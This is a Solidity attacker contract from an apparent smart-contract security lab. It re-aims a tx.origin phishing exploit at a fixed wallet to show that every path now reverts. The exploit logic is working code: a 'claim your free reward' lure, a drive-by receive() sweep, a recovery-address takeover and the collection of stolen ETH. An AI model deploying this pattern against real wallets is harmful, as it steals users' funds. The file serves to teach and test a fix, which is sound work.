// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {MsgSenderWallet} from "../fixed/MsgSenderWallet.sol";

/// @title MsgSenderWalletAttacker
/// @notice The vuln-3 exploit, re-pointed at the FIXED wallet. EtherShield lab,
///         local chain and fake funds only.
/// @dev This is TxOriginAttacker with one thing changed: the type it attacks.
///      The attack logic is byte-for-byte the same lure, the same sweep, the
///      same drive-by `receive()`. It has to be, or the comparison would prove
///      nothing - a different exploit failing is not evidence that the fix
///      works. (The original cannot simply be re-aimed: it is typed
///      `TxOriginWallet` in its constructor and state, the same reason vuln 1
///      needed SecureVaultAttacker. A shared `IWallet` interface both wallets
///      implement would collapse the two files if that is ever worth doing.)
///
///      Every path through this contract now reverts. `MsgSenderWallet` asks
///      who is CALLING, and the answer is this contract - not the victim, no
///      matter whose signature started the transaction. The victim can take the
///      lure, sign the call, even send ETH here, and the sweep inside fails,
///      which reverts their whole transaction. The confused deputy has no
///      deputy to confuse.
///
///      `claimOwnershipByRecovery()` is the extra probe: the fix routes
///      `setRecoveryAddress` through the same modifier as the money, so the
///      attacker cannot nominate itself and then walk in through the recovery
///      door either. Both halves of the surface are now closed.
contract MsgSenderWalletAttacker {
    /// @notice The wallet being drained.
    MsgSenderWallet public immutable wallet;
    /// @notice The attacker's EOA - the only address allowed to collect the loot.
    address public immutable owner;

    /// @notice Set once the wallet has been swept. Instrumentation for the tests.
    bool public hijacked;
    /// @notice How much the sweep took, recorded before the transfer.
    uint256 public stolen;
    /// @notice How many times the lure was taken. Shows the attack needs exactly one.
    uint256 public lureCount;

    event LureTaken(address indexed victim, uint256 count);
    event Hijacked(address indexed victim, uint256 amount);
    event Collected(address indexed to, uint256 amount);

    error NotOwner();
    error PayoutFailed();

    constructor(MsgSenderWallet _wallet) {
        wallet = _wallet;
        owner = msg.sender;
    }

    /// @notice The lure. Looks like "claim your free reward"; actually sweeps
    ///         the caller's wallet. The victim signs this call themselves.
    function claimReward() external {
        _hijack();
    }

    /// @notice The drive-by variant: the victim only has to SEND ETH here - a
    ///         donation, a tip, a mistyped transfer - and the attack still runs.
    /// @dev The wallet's own sweep pays into this function too, so inbound ETH
    ///      from the wallet must not re-enter the attack.
    receive() external payable {
        if (msg.sender != address(wallet)) {
            _hijack();
        }
    }

    /// @notice Hijack `transferTo` instead of `sweep` - the other function the
    ///         broken modifier guards. Proves the finding is the modifier, not
    ///         one careless function.
    function tryTransfer(uint256 amount) external {
        wallet.transferTo(address(this), amount);
    }

    /// @notice Attempt the same hijack against `setRecoveryAddress`, which
    ///         checks `msg.sender` inline. Expected to REVERT: this contract is
    ///         the caller, and it is not the owner. Left unguarded on purpose so
    ///         the revert reaches the test.
    function tryHijackRecovery() external {
        wallet.setRecoveryAddress(address(this));
    }

    /// @notice Same attempt against `recoverOwnership`, also `msg.sender`-checked.
    ///         Expected to REVERT.
    function tryRecoverOwnership() external {
        wallet.recoverOwnership();
    }

    /// @notice The full recovery-door attack in one call: nominate itself, then
    ///         take over. Reverts at the first step now that `setRecoveryAddress`
    ///         is behind the same modifier as the money.
    function claimOwnershipByRecovery() external {
        wallet.setRecoveryAddress(address(this));
        wallet.recoverOwnership();
    }

    /// @dev The attack itself. Reads the wallet's balance for the record, then
    ///      sweeps it. State is written BEFORE the external call (the CEI habit
    ///      from vuln 1), so the inbound ETH cannot re-enter this.
    function _hijack() private {
        lureCount += 1;
        emit LureTaken(tx.origin, lureCount);

        // The victim is the transaction's origin right now, so the wallet's
        // `onlyOwner` modifier waves this call through. One call, whole balance.
        uint256 amount = wallet.balance();
        stolen += amount;
        hijacked = true;
        emit Hijacked(tx.origin, amount);
        wallet.sweep(address(this));
    }

    /// @notice Forward the stolen ETH to the attacker's EOA.
    /// @dev Note the irony: this guard uses `msg.sender`, because the attacker
    ///      cannot afford the bug he just exploited.
    function collect() external {
        if (msg.sender != owner) revert NotOwner();
        uint256 amount = address(this).balance;
        emit Collected(owner, amount);
        (bool ok,) = owner.call{value: amount}("");
        if (!ok) revert PayoutFailed();
    }

    /// @notice ETH currently held by this exploit contract.
    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
